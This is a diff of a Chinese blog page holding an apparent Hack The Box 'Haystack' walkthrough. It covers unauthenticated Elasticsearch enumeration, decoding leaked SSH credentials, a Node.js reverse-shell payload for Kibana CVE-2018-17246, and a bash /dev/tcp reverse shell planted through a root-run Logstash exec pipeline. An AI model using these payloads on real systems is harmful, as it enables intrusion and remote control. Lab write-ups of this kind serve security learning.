@@ -28,13 +28,27 @@
 <meta property="og:site_name" content="Love ❤ Hacking">
 <meta property="og:description" content="80端口首页没有内容，目录枚举没有任何发现">
 <meta property="og:locale">
-<meta property="og:image" content="http://evilarsene.icu/2021/05/16/images/Haystack/1.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Haystack/1.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Haystack/2.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Haystack/3.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Haystack/4.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Haystack/5.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Haystack/6.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Haystack/7.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Haystack/8.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Haystack/9.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Haystack/10.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Haystack/11.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Haystack/12.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Haystack/13.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Haystack/14.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Haystack/15.png">
 <meta property="article:published_time" content="2021-05-16T08:52:04.000Z">
-<meta property="article:modified_time" content="2021-05-16T08:53:16.335Z">
+<meta property="article:modified_time" content="2021-05-23T02:45:57.123Z">
 <meta property="article:author" content="EvilArsene">
 <meta property="article:tag" content="Linux靶机">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://evilarsene.icu/2021/05/16/images/Haystack/1.png">
+<meta name="twitter:image" content="http://evilarsene.icu/images/Haystack/1.png">
 
 <link rel="canonical" href="http://evilarsene.icu/2021/05/16/HTB-Haystack/">
 
@@ -216,10 +230,16 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2021-05-16 16:52:04 / 修改时间：16:53:16" itemprop="dateCreated datePublished" datetime="2021-05-16T16:52:04+08:00">2021-05-16</time>
+              <time title="创建时间：2021-05-16 16:52:04" itemprop="dateCreated datePublished" datetime="2021-05-16T16:52:04+08:00">2021-05-16</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-05-23 10:45:57" itemprop="dateModified" datetime="2021-05-23T10:45:57+08:00">2021-05-23</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="fa fa-folder-o"></i>
@@ -241,11 +261,71 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="../images/Haystack/1.png" alt="1"></p>
+        <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="/images/Haystack/1.png" alt="1"></p>
 <p>80端口首页没有内容，目录枚举没有任何发现</p>
-<p>9200端口很有意思，是Elasticsearch的默认端口</p>
+<p>9200端口很有意思，这是Elasticsearch的默认端口</p>
 <h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>访问9200端口，返回了json页面</p>
-<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1>
+<p><img src="/images/Haystack/2.png" alt="2"></p>
+<p><code>You Know, for Search</code>是一个提示，说明ES会受到未授权访问，我们可以枚举它的索引</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.10.115:9200&#x2F;_cat&#x2F;indices</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Haystack/3.png" alt="3"></p>
+<p>发现了两个索引，quotes和bank。这里数据较多，可以使用<code>jq</code>来检索json</p>
+<p>以<code>quotes</code>索引为例，首先枚举它的<code>documents</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s &#39;http:&#x2F;&#x2F;10.10.10.115:9200&#x2F;quotes&#x2F;_search?size&#x3D;1&#39; |jq .</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Haystack/4.png" alt="4"></p>
+<p><code>quote</code>里有西班牙语的留言看上去比较有意思，单独提取它</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s &#39;http:&#x2F;&#x2F;10.10.10.115:9200&#x2F;quotes&#x2F;_search?size&#x3D;1&#39; |jq &#39;.hits.hits[]._source.quote&#39;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Haystack/5.png" alt="5"></p>
+<p>之后提取全部253条，保存到文件里</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s &#39;http:&#x2F;&#x2F;10.10.10.115:9200&#x2F;quotes&#x2F;_search?size&#x3D;253&#39; |jq &#39;.hits.hits[]._source.quote&#39; | tee &#x2F;root&#x2F;Desktop&#x2F;quote.txt</span><br></pre></td></tr></table></figure>
+
+<p>这个文本量太大，我是用<code>grep</code>配合一些常见的西班牙语单词进行寻找</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Contraseña		密码</span><br><span class="line">Clave			密钥</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Haystack/6.png" alt="6"></p>
+<p>得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cGFzczogc3BhbmlzaC5pcy5rZXk&#x3D;</span><br><span class="line">dXNlcjogc2VjdXJpdHkg</span><br></pre></td></tr></table></figure>
+
+<p>分别进行base64解码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; echo -n cGFzczogc3BhbmlzaC5pcy5rZXk&#x3D; |base64 -d</span><br><span class="line">pass: spanish.is.key</span><br><span class="line">&gt; echo -n dXNlcjogc2VjdXJpdHkg |base64 -d</span><br><span class="line">user: security</span><br></pre></td></tr></table></figure>
+
+<p>使用凭据<code>security/spanish.is.key</code>进行ssh，获得shell</p>
+<p><img src="/images/Haystack/7.png" alt="7"></p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="kibana"><a href="#kibana" class="headerlink" title="kibana"></a>kibana</h2><p>机器运行着ELK架构，不过logstash运行在了root权限</p>
+<p><img src="/images/Haystack/8.png" alt="8"></p>
+<p>kibana监听在了本地端口</p>
+<p><img src="/images/Haystack/9.png" alt="9"></p>
+<p>通过ssh建立隧道，我们可以在以后的ssh会话中输入<code>~C</code>可以进入ssh命令行，接着进行正向隧道</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-L 9999:127.0.0.1:5601</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Haystack/10.png" alt="10"></p>
+<p>访问本地的9999端口，成功进入kibana，并且得到版本6.4.2</p>
+<p><img src="/images/Haystack/11.png" alt="11"></p>
+<p>谷歌搜索<code>kinaba 6.4.2 exploit</code>，得到了<a target="_blank" rel="noopener" href="https://github.com/mpgn/CVE-2018-17246">CVE-2018-17246</a></p>
+<p>这个漏洞可能通过预先上传node reverse shell，通过kibana包含后解析，所以正常来说需要配合上传漏洞。不过我们已经拿到了shell，所以可以在机器上写文件了。同时作者提示了，触发多次shell需要不同的文件名，这里需要注意</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(function()&#123;</span><br><span class="line">    var net &#x3D; require(&quot;net&quot;),</span><br><span class="line">        cp &#x3D; require(&quot;child_process&quot;),</span><br><span class="line">        sh &#x3D; cp.spawn(&quot;&#x2F;bin&#x2F;sh&quot;, []);</span><br><span class="line">    var client &#x3D; new net.Socket();</span><br><span class="line">    client.connect(4444, &quot;10.10.16.12&quot;, function()&#123;</span><br><span class="line">        client.pipe(sh.stdin);</span><br><span class="line">        sh.stdout.pipe(client);</span><br><span class="line">        sh.stderr.pipe(client);</span><br><span class="line">    &#125;);</span><br><span class="line">    return &#x2F;a&#x2F;; &#x2F;&#x2F; Prevents the Node.js application form crashing</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Haystack/12.png" alt="12"></p>
+<h2 id="root"><a href="#root" class="headerlink" title="root"></a>root</h2><p>发现了属于root创建，当前组可读的logstash文件</p>
+<p><img src="/images/Haystack/13.png" alt="13"></p>
+<p><code>input.conf</code>查找<code>/opt/kibana/logstash_</code>开头的文件，并添加执行权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">bash-4.2$ cat input.conf </span><br><span class="line">input &#123;</span><br><span class="line">        file &#123;</span><br><span class="line">                path &#x3D;&gt; &quot;&#x2F;opt&#x2F;kibana&#x2F;logstash_*&quot;</span><br><span class="line">                start_position &#x3D;&gt; &quot;beginning&quot;</span><br><span class="line">                sincedb_path &#x3D;&gt; &quot;&#x2F;dev&#x2F;null&quot;</span><br><span class="line">                stat_interval &#x3D;&gt; &quot;10 second&quot;</span><br><span class="line">                type &#x3D;&gt; &quot;execute&quot;</span><br><span class="line">                mode &#x3D;&gt; &quot;read&quot;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>filter.conf</code>读取文件的内容，进行正则匹配，提取comando语句块</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">        if [type] &#x3D;&#x3D; &quot;execute&quot; &#123;</span><br><span class="line">                grok &#123;</span><br><span class="line">                        match &#x3D;&gt; &#123; &quot;message&quot; &#x3D;&gt; &quot;Ejecutar\s*comando\s*:\s+%&#123;GREEDYDATA:comando&#125;&quot; &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>output.conf</code>执行comando部分的命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">output &#123;</span><br><span class="line">        if [type] &#x3D;&#x3D; &quot;execute&quot; &#123;</span><br><span class="line">                stdout &#123; codec &#x3D;&gt; json &#125;</span><br><span class="line">                exec &#123;</span><br><span class="line">                        command &#x3D;&gt; &quot;%&#123;comando&#125; &amp;&quot;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以我们可以<code>/opt/kibana/</code>目录下创造<code>logstash_evil</code>文件，里面存放合适的正则内容，我是用<a target="_blank" rel="noopener" href="https://jex.im/regulex/#!flags=&re=Ejecutar%5Cs*comando%5Cs*%3A%5Cs%2B%25%7BGREEDYDATA%3Acomando%7D">链接</a>来辅助分析，并使用<a target="_blank" rel="noopener" href="http://grokdebug.herokuapp.com/">链接</a>来验证输入是否合法</p>
+<p><img src="/images/Haystack/14.png" alt="14"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;Ejecutar comando: bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.16.12&#x2F;5555 0&gt;&amp;1&#39; &gt; &#x2F;opt&#x2F;kibanalogstash_shell</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Haystack/15.png" alt="15"></p>
+
     </div>
 
     
@@ -328,7 +408,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B8%97%E9%80%8F"><span class="nav-number">2.</span> <span class="nav-text">渗透</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">3.</span> <span class="nav-text">提权</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B8%97%E9%80%8F"><span class="nav-number">2.</span> <span class="nav-text">渗透</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">3.</span> <span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#kibana"><span class="nav-number">3.1.</span> <span class="nav-text">kibana</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#root"><span class="nav-number">3.2.</span> <span class="nav-text">root</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -344,7 +424,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">157</span>
+          <span class="site-state-item-count">159</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
